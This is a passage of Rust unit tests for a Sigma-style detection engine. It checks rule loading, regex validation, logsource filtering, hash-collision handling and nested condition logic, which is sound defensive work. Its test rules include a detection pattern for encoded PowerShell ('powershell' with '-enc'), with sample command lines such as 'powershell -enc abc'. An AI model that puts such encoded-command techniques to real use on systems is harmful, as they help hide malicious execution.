                2,
                "Two valid rules must be loaded, got successes={:?} errors={:?}",
                successes,
                errors
            );
            assert_eq!(
                errors.len(),
                1,
                "One invalid document must produce exactly one error"
            );
        }

        /// A rule with an invalid `|re` pattern must be rejected at load time.
        /// An uncompilable regex can never match, so silently accepting it
        /// would disable the detection without any operator signal.
        #[test]
        fn load_rule_invalid_regex_is_load_error() {
            let yaml = r#"
title: Broken Regex Rule
logsource: {}
detection:
    sel:
        CommandLine|re: '[invalid'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            let result = engine.load_rule(yaml);
            assert!(
                matches!(result, Err(EngineError::InvalidRegex { .. })),
                "Invalid |re pattern must produce EngineError::InvalidRegex, got {result:?}"
            );
            assert_eq!(
                engine.rule_count(),
                0,
                "Rejected rule must not be partially loaded"
            );

            // Engine must remain fully usable after the rejected load.
            engine.load_rule(MINIMAL_RULE).unwrap();
            let event = make_event(&[
                ("CommandLine", "evil.exe"),
                ("category", "process_creation"),
                ("product", "windows"),
            ]);
            assert_eq!(engine.evaluate_event(&event).len(), 1);
        }

        /// Bulk loading: a rule with a bad regex is collected as an error while
        /// the remaining valid rules load normally.
        #[test]
        fn load_rules_invalid_regex_collected_as_error() {
            let yaml = "\
title: Valid Rule A\n\
logsource: {}\n\
detection:\n    sel:\n        field: value\n    condition: sel\n\
---\n\
title: Broken Regex Rule\n\
logsource: {}\n\
detection:\n    sel:\n        CommandLine|re: '(unclosed'\n    condition: sel\n\
---\n\
title: Valid Rule B\n\
logsource: {}\n\
detection:\n    sel:\n        other: thing\n    condition: sel";
            let mut engine = SigmaEngine::new();
            let (successes, errors) = engine.load_rules(yaml);
            assert_eq!(successes.len(), 2, "Valid rules must load: {errors:?}");
            assert_eq!(errors.len(), 1, "Bad-regex rule must produce one error");
            assert!(
                matches!(errors[0], EngineError::InvalidRegex { .. }),
                "Error must be InvalidRegex, got {:?}",
                errors[0]
            );
        }

        // ── Group 4: Behavioral Invariants ───────────────────────────────

        /// Loading the same rule twice (same title, same detection) must result
        /// in rule_count() == 2. The engine does not deduplicate silently.
        /// Callers are responsible for deduplication at the ingestion layer.
        #[test]
        fn duplicate_rule_loads_both_no_silent_dedup() {
            let mut engine = SigmaEngine::new();
            engine.load_rule(MINIMAL_RULE).unwrap();
            engine.load_rule(MINIMAL_RULE).unwrap();
            assert_eq!(
                engine.rule_count(),
                2,
                "Duplicate rules must both be stored — no silent deduplication"
            );
        }

        /// Logsource filtering must be case-insensitive.
        /// A rule specifying `product: Windows` must fire for an event with
        /// `product: windows` (all-lowercase) and vice versa.
        #[test]
        fn logsource_filtering_is_case_insensitive() {
            let yaml = r#"
title: Case Test
logsource:
    product: Windows
    category: process_creation
detection:
    sel:
        CommandLine|contains: 'target'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Lowercase product — must still match
            let event = make_event(&[
                ("CommandLine", "target.exe"),
                ("product", "windows"), // lowercase, rule says "Windows"
                ("category", "process_creation"),
            ]);
            let results = engine.evaluate_event(&event);
            assert_eq!(
                results.len(),
                1,
                "Logsource match must be case-insensitive; rule='Windows' event='windows'"
            );
        }

        /// A rule with no logsource constraints must fire for ANY event category,
        /// regardless of what the event's logsource fields contain.
        #[test]
        fn rule_without_logsource_matches_any_event() {
            let yaml = r#"
title: Wildcard Logsource
logsource: {}
detection:
    sel:
        TargetField|contains: 'hit'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            for category in &["process_creation", "network", "dns", "registry", "file", ""] {
                let event = make_event(&[("TargetField", "hit"), ("category", category)]);
                let results = engine.evaluate_event(&event);
                assert_eq!(
                    results.len(),
                    1,
                    "Wildcard logsource rule must fire for category '{category}'"
                );
            }
        }

        /// 32-bit FNV-1a hash of a lowercased string — mirrors the engine's
        /// private logsource hash so the collision test below can construct
        /// genuinely colliding category names.
        fn fnv1a_lower(s: &str) -> u32 {
            let mut h: u32 = 2_166_136_261;
            for b in s.bytes() {
                h ^= u32::from(b.to_ascii_lowercase());
                h = h.wrapping_mul(16_777_619);
            }
            if h == 0 {
                1
            } else {
                h
            }
        }

        /// The hot loop compares logsource fields by 32-bit hash. Two distinct
        /// category strings with colliding hashes must NOT cause the rule to
        /// fire for the wrong category — the cold-path string recheck catches it.
        #[test]
        fn logsource_hash_collision_does_not_misroute() {
            // Brute-force a real FNV-1a collision (birthday bound: ~77k tries).
            let mut seen: HashMap<u32, String> = HashMap::new();
            let mut pair: Option<(String, String)> = None;
            for i in 0..2_000_000u32 {
                let cand = format!("cat_{i}");
                match seen.entry(fnv1a_lower(&cand)) {
                    std::collections::hash_map::Entry::Occupied(e) => {
                        pair = Some((e.get().clone(), cand));
                        break;
                    }
                    std::collections::hash_map::Entry::Vacant(e) => {
                        e.insert(cand);
                    }
                }
            }
            let (rule_cat, event_cat) = pair.expect("no FNV-1a collision found in 2M candidates");
            assert_ne!(rule_cat, event_cat);
            assert_eq!(fnv1a_lower(&rule_cat), fnv1a_lower(&event_cat));

            let yaml = format!(
                "title: Collision Test\nlogsource:\n    category: {rule_cat}\ndetection:\n    sel:\n        CommandLine|contains: 'hit'\n    condition: sel\n"
            );
            let mut engine = SigmaEngine::new();
            engine.load_rule(&yaml).unwrap();

            // Event category hash-collides with the rule's but the strings differ.
            let colliding = make_event(&[("CommandLine", "hit"), ("category", &event_cat)]);
            assert!(
                engine.evaluate_event(&colliding).is_empty(),
                "Hash collision must not route event '{event_cat}' to rule for '{rule_cat}'"
            );

            // Sanity: the genuine category still matches.
            let genuine = make_event(&[("CommandLine", "hit"), ("category", &rule_cat)]);
            assert_eq!(engine.evaluate_event(&genuine).len(), 1);
        }

        /// A rule requiring `CommandLine` must never fire when only `ProcessName`
        /// is present in the event (absent-field semantics).
        #[test]
        fn required_field_absent_from_event_never_fires() {
            let mut engine = SigmaEngine::new();
            engine.load_rule(MINIMAL_RULE).unwrap();
            // Event has `ProcessName` only — `CommandLine` is absent
            let event = make_event(&[("ProcessName", "evil.exe")]);
            let results = engine.evaluate_event(&event);
            assert!(
                results.is_empty(),
                "Rule requiring absent field must not fire: {:?}",
                results
            );
        }

        /// AND logic across two identifiers: BOTH fields must be present and match.
        /// If only one field matches the rule must not fire.
        #[test]
        fn and_logic_requires_both_fields() {
            let mut engine = SigmaEngine::new();
            engine.load_rule(TWO_FIELD_RULE).unwrap();

            // Only first identifier matches
            let only_proc = make_event(&[("Image", "C:\\Windows\\cmd.exe")]);
            assert!(
                engine.evaluate_event(&only_proc).is_empty(),
                "Only Image matching must not trigger AND rule"
            );

            // Only second identifier matches
            let only_arg = make_event(&[("CommandLine", "cmd -enc abc")]);
            assert!(
                engine.evaluate_event(&only_arg).is_empty(),
                "Only CommandLine matching must not trigger AND rule"
            );

            // Both match
            let both = make_event(&[
                ("Image", "C:\\Windows\\cmd.exe"),
                ("CommandLine", "cmd -enc abc"),
            ]);
            let results = engine.evaluate_event(&both);
            assert_eq!(
                results.len(),
                1,
                "Both fields matching must trigger AND rule"
            );
        }

        // ── Group 5: Parallel Array Invariant (via observable behavior) ──

        /// Load 10 rules then batch-evaluate 20 events. The result count per event
        /// must be in [0, 10] and the call must complete without panic.
        /// A panic here would indicate the parallel arrays (rules, hot_data,
        /// rule_regex_maps) fell out of sync during successive add_compiled_rule calls.
        #[test]
        fn parallel_arrays_stay_in_sync_across_ten_rules() {
            let mut engine = SigmaEngine::new();
            for i in 0..10usize {
                let yaml = format!(
                    "title: Rule {i}\nlogsource: {{}}\ndetection:\n    sel:\n        CommandLine|contains: 'marker_{i}'\n    condition: sel\n"
                );
                engine.load_rule(&yaml).unwrap();
            }
            assert_eq!(engine.rule_count(), 10);

            let events: Vec<HashMap<String, String>> = (0..20)
                .map(|i| make_event(&[("CommandLine", &format!("marker_{}", i % 10))]))
                .collect();

            let results = engine.evaluate_batch(&events);
            assert_eq!(
                results.len(),
                20,
                "evaluate_batch must return one result-vec per event"
            );
            for (i, event_results) in results.iter().enumerate() {
                assert!(
                    event_results.matches.len() <= 10,
                    "Event {i} returned more matches than rules loaded: {}",
                    event_results.matches.len()
                );
                // Each event has exactly one matching marker — verify at least one match
                assert_eq!(
                    event_results.matches.len(),
                    1,
                    "Event {i} (marker_{}) should match exactly 1 rule",
                    i % 10
                );
            }
        }

        // ── Group 6: Deep Condition Nesting ──────────────────────────────

        /// A rule with a complex condition using nested AND/OR/NOT must parse
        /// and evaluate correctly. Tests the condition AST compiler at depth.
        #[test]
        fn deep_nested_condition_evaluates_correctly() {
            let yaml = r#"
title: Deep Nesting Test
logsource: {}
detection:
    sel1:
        CommandLine|contains: 'powershell'
    sel2:
        CommandLine|contains: '-enc'
    filter1:
        CommandLine|contains: 'legitimate'
    filter2:
        Image|endswith: 'trusted.exe'
    condition: (sel1 and sel2) and not (filter1 or filter2)
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Should match: has both sel1+sel2, neither filter
            let hit = make_event(&[("CommandLine", "powershell -enc abc")]);
            assert_eq!(
                engine.evaluate_event(&hit).len(),
                1,
                "Must detect nested condition match"
            );

            // Should NOT match: filter1 present
            let filtered = make_event(&[("CommandLine", "powershell -enc abc legitimate")]);
            assert!(
                engine.evaluate_event(&filtered).is_empty(),
                "filter1 must suppress the rule"
            );

            // Should NOT match: filter2 present
            let trusted = make_event(&[
                ("CommandLine", "powershell -enc abc"),
                ("Image", "C:\\path\\trusted.exe"),
            ]);
            assert!(
                engine.evaluate_event(&trusted).is_empty(),
                "filter2 must suppress the rule"
            );

            // Should NOT match: sel2 absent
            let no_enc = make_event(&[("CommandLine", "powershell run-script")]);
            assert!(
                engine.evaluate_event(&no_enc).is_empty(),
                "Without -enc, sel2 fails — AND rule must not fire"
            );
        }

        /// `evaluate_event` takes `&self` — multiple threads can evaluate
        /// against the same engine concurrently once rule loading is done.
        #[test]
        fn evaluate_event_is_safe_to_call_concurrently() {
            use std::sync::Arc;

            let mut engine = SigmaEngine::new();
            engine.load_rule(MINIMAL_RULE).unwrap();
            let engine = Arc::new(engine); // wrap in Arc — only works because evaluate_event is &self

            let handles: Vec<_> = (0..8)
                .map(|i| {
                    let eng = Arc::clone(&engine);
                    std::thread::spawn(move || {
                        let mut event = HashMap::new();
                        // Even threads pass a matching command line, odd threads do not.
                        let cmd = if i % 2 == 0 {
                            "run evil.exe"
                        } else {
                            "notepad.exe"
                        };
                        event.insert("CommandLine".to_string(), cmd.to_string());
                        event.insert("event_category".to_string(), "process_creation".to_string());
                        event.insert("event_product".to_string(), "windows".to_string());
                        (i, eng.evaluate_event(&event).len())
                    })
                })
                .collect();

            for handle in handles {
                let (i, count) = handle.join().expect("thread panicked");
                let expected = if i % 2 == 0 { 1 } else { 0 };
                assert_eq!(count, expected, "thread {i}: unexpected match count");
            }
        }
    }
}
